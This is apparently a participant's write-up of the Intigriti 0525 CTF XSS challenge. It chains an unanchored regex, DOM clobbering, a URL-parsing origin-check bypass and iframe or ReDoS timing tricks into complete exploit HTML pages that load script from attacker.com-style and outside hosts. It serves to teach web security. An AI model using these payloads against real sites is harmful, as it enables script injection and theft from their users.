# Intigriti January Challenge 0525

This was the @Intigriti monthly CTF, challenge crafted by @joaxcar. I spent a good chunk of my weekend on this one. A few hours of actual progress, a few hours of staring at devtools wondering why something that should work was not working. Worth it.

## The Challenge Code

```javascript
// utils
function safeURL(url) {
  let normalizedURL = new URL(url, location)
  return normalizedURL.origin === location.origin
}

function addDynamicScript() {
  const src = window.CONFIG_SRC?.dataset["url"] || location.origin + "/confetti.js"
  if (safeURL(src)) {
    const script = document.createElement('script');
    script.src = new URL(src);
    document.head.appendChild(script);
  }
}

// main
(function () {
  const params = new URLSearchParams(window.location.search);
  const name = params.get('name');

  if (name && name.match(/([a-zA-Z0-9]+|\s)+$/)) {
    const messageDiv = document.getElementById('message');
    const spinner = document.createElement('div');
    spinner.classList.add('spinner');
    messageDiv.appendChild(spinner);

    fetch(`/message?name=${encodeURIComponent(name)}`)
      .then(response => response.text())
      .then(data => {
        spinner.remove();
        messageDiv.innerHTML = DOMPurify.sanitize(data);
      })
      .catch(err => {
        spinner.remove();
        messageDiv.innerHTML = "Error fetching message.";
        console.error('Error fetching message:', err);
      });

  } else if (name) {
    const messageDiv = document.getElementById('message');
    messageDiv.innerHTML = "Error when parsing name";
  }

  requestIdleCallback(addDynamicScript);
})();
```

The goal is XSS. Read through this and it looks like a pretty well-defended target at first glance. DOMPurify on anything that touches `innerHTML`, an origin check before any script loads, and a regex on user input. Let me walk through how each of these fell apart.

## Reading the Code Carefully

The line that grabbed my attention first was this:

```javascript
const src = window.CONFIG_SRC?.dataset["url"] || location.origin + "/confetti.js"
```

The page is reading a URL from a global called `CONFIG_SRC`, specifically from its `dataset["url"]` property, which corresponds to a `data-url` HTML attribute. If `CONFIG_SRC` does not exist on `window`, it falls back to loading `confetti.js` from the same origin. So the question became: can I make `window.CONFIG_SRC` exist and point somewhere I control?

This is DOM clobbering. If I can inject an element with `id="CONFIG_SRC"` and `data-url="https://attacker.com/evil.js"` into the page, the browser will automatically expose it as `window.CONFIG_SRC` and the script will read my URL from it.

The next question was whether I could actually get HTML into the DOM.

## The Regex is Not as Strict as it Looks

The `name` parameter gets validated against this regex before anything happens:

```javascript
/([a-zA-Z0-9]+|\s)+$/
```

The `$` anchors the match to the end of the string. There is no `^` anchoring it to the start. That means the engine only cares whether the string ends with a valid sequence. Whatever comes before that is irrelevant to whether the match succeeds.

So a payload like:

```
</strong><div id="CONFIG_SRC" data-url="https://attacker.com/evil.js">validtext
```

passes the regex because `validtext` at the end satisfies `([a-zA-Z0-9]+|\s)+$`. The HTML prefix is completely ignored by the pattern.

I confirmed this, injected the payload, and checked devtools. The element was in the DOM. But `window.CONFIG_SRC` was still `undefined`.

## Why the DOM Clobbering Was Not Working

This took a while to figure out. The element existed, but the script was not picking it up. I started tracing the execution order and noticed `addDynamicScript` was passed to `requestIdleCallback`.

`requestIdleCallback` is a browser API that defers a function until the main thread has nothing more important to do. It runs during idle gaps in the event loop. The MDN docs describe it as a way to schedule non-critical work without blocking rendering or user interaction.

The problem is timing. When the page loads, the main function runs, fires the `fetch` call, and then registers `addDynamicScript` as an idle callback. `fetch` is asynchronous, it hands off to the network and does not block the thread. So the thread goes idle almost immediately while waiting for the response. The idle callback fires. At this point, `messageDiv.innerHTML` has not been set yet because the fetch has not returned. My injected element does not exist in the DOM yet. `window.CONFIG_SRC` is undefined. The fallback URL loads `confetti.js` instead.

By the time the fetch completes and `DOMPurify.sanitize(data)` writes my element into the DOM, `addDynamicScript` has already run and finished.

So I needed to delay that idle callback until after the fetch response was processed.

## Bypassing the Origin Check

Before solving the timing problem, I also needed to handle `safeURL`. Even if I got my `CONFIG_SRC` read in time, the URL had to pass this:

```javascript
function safeURL(url) {
  let normalizedURL = new URL(url, location)
  return normalizedURL.origin === location.origin
}
```

The check constructs a URL using `new URL(url, location)` where `location` is the base. Then it compares the resulting origin against the page's own origin. Looks airtight.

The thing is, this is not the same URL constructor call that actually sets `script.src`. Down in `addDynamicScript`:

```javascript
script.src = new URL(src);
```

No base URL here. Two different constructor calls, two different parsing behaviors.

I spent time in devtools fuzzing URL strings that would behave differently between these two calls. The one that worked was a single-slash protocol URL:

```
https:/attacker.com/evil.js
```

When you pass `https:/attacker.com/evil.js` to `new URL(input, location)`, the browser treats the single slash as a relative path reference and resolves it against the current origin. The resulting origin matches the page. Check passes.

When you then pass that same string to `new URL(src)` with no base, the constructor parses it as an absolute URL and resolves it correctly to `attacker.com`. Script loads from the external domain.

The origin check sees the current origin. The script loader sees the attacker's server. That gap is the bypass.

## Solving the Timing Problem on Chrome

The approach that worked on Chrome was framing the challenge page inside an iframe and then hammering the parent page's rendering pipeline with enough work to keep the event loop busy. Since same-site iframes share the event loop with the parent, keeping the parent's thread occupied delayed the idle callback in the child frame.

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Exploit</title>
  </head>
  <body>
    <iframe
      width="100%"
      height="500%"
      src="https://challenge-0525.intigriti.io/index.html?name=%3C/strong%3E%3Cdiv%20id=CONFIG_SRC%20data-url=%22https:/temp.staticsave.com/6821d52de70e4.js%22%3Ell%3C/div%3Edcsd"
    ></iframe>
    <div class="container"></div>

    <script>
      async function blockThread() {
        var svgBlock = `<svg width="10000" height="10000">
          <g>
            <circle cx="1" cy="1" r="1" fill="red" />
            <circle cx="2" cy="2" r="1" fill="blue" />
            <circle cx="3" cy="3" r="1" fill="green" />
          </g>
        </svg>`;
        var container = document.querySelector(".container");
        container.innerHTML = svgBlock;
        for (var i = 0; i < 1200; i++) {
          container.innerHTML += svgBlock;
        }
      }
      setTimeout(blockThread, 2);
    </script>
  </body>
</html>
```

Alert fired in Chrome.

## Firefox Was a Different Problem

Cross-origin iframes in Firefox run in separate OS threads. The parent and child frame have completely independent event loops. Flooding the parent with rendering work does nothing to the child's thread. They do not share a scheduler.

I was stuck here for a while. The challenge hints from Intigriti mentioned something about window isolation, which made more sense in hindsight than it did at the time.

What actually broke the deadlock was remembering an error I had seen earlier while testing the regex with a very long input string. Firefox threw:

```
Uncaught InternalError: too much recursion
```

The regex `/([a-zA-Z0-9]+|\s)+$/` has nested quantifiers. The `([a-zA-Z0-9]+|\s)+` part means the outer group can match by combining alphanumeric runs and spaces in many different ways for the same string. When the input is long and the regex fails to match, the engine has to backtrack through an exponential number of combinations before giving up. On a long enough input this takes real time and pins the thread.

That is the ReDoS condition. And because the regex runs in the challenge page's own thread, a ReDoS input keeps that same thread too busy to service the idle callback.

The final exploit loads multiple iframes with a ReDoS payload to keep the challenge thread occupied, plus one iframe carrying the actual XSS payload. The busy thread cannot service the idle callback until after the fetch returns and the DOM is updated.

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Exploit</title>
  </head>
  <body>
    <iframe
      width="50%"
      height="100%"
      src="https://challenge-0525.intigriti.io/index.html?name=%3C/strong%3E%3Cdiv%20id=CONFIG_SRC%20data-url=%22https:/temp.staticsave.com/6821d52de70e4.js%22%3Ell%3C/div%3Edcsd"
    ></iframe>
    <div class="container"></div>

    <script>
      function loadRedosFrames() {
        var redosFrame = `<iframe
          width="50%"
          height="100%"
          src="https://challenge-0525.intigriti.io/index.html?name=wededwedwedwed25%32%36%25%36%34%25%36%ewdewedwedwedwedwedwedwededw33%25%37%33%25%36%34%25%36%33%25%36%34%25%36%33%25%37%33%25%36%33%25%37%33%25%36%34%25%36%34%25%33%39%25%33%33%25%33%30%25%33%38%25%33%32%25%33%33%25%33%37%25%36%65%25%33%32%25%33%33%25%33%37%25%33%34%25%33%34%25%33%39%25%33%33%25%33%32%25%33%34%25%33%32%25%33%33%25%33%34%25%33%39%25%33%37%25%33%33%25%33%30%25%33%30%25%33%31%25%33%32%25%33%38%25%33%33%25%33%31%25%33%39%25%33%32%25%32%36%25%35%65%25%32%35%25%35%65%25%32%36%25%32%61%25%32%38%25%32%39%25%32%39%25%32%38%25%32%61%25%32%36%25%35%65%25%32%35%25%32%34%25%32%33%25%34%30&&name=dcsdcscdsc"
        ></iframe>`;
        var container = document.querySelector(".container");
        container.innerHTML = redosFrame;
        for (var i = 0; i < 5; i++) {
          container.innerHTML += redosFrame;
        }
      }

      setTimeout(loadRedosFrames, 50);
    </script>
  </body>
</html>
```

Alert fired in Firefox.

## Putting It Together

Five separate issues, each one a prerequisite for the next.

The regex missing a `^` anchor meant HTML could be injected through the `name` parameter. That HTML injection enabled DOM clobbering by planting an element with `id="CONFIG_SRC"` and a `data-url` pointing to an external script. The URL constructor inconsistency between the two `new URL()` calls meant the origin check could be fooled with a single-slash protocol string while the script loader still resolved the external domain correctly. The `requestIdleCallback` timing meant none of that mattered unless the idle callback was delayed past the fetch response. And the ReDoS in the regex was what made the delay reliable across browsers, including Firefox where cross-origin threading made other approaches useless.

None of these individually gets you XSS. All five together do.

Props to @joaxcar for the design. Challenges that make you understand something new to finish them are the ones worth spending a weekend on.

---

*Happy Pwning!*
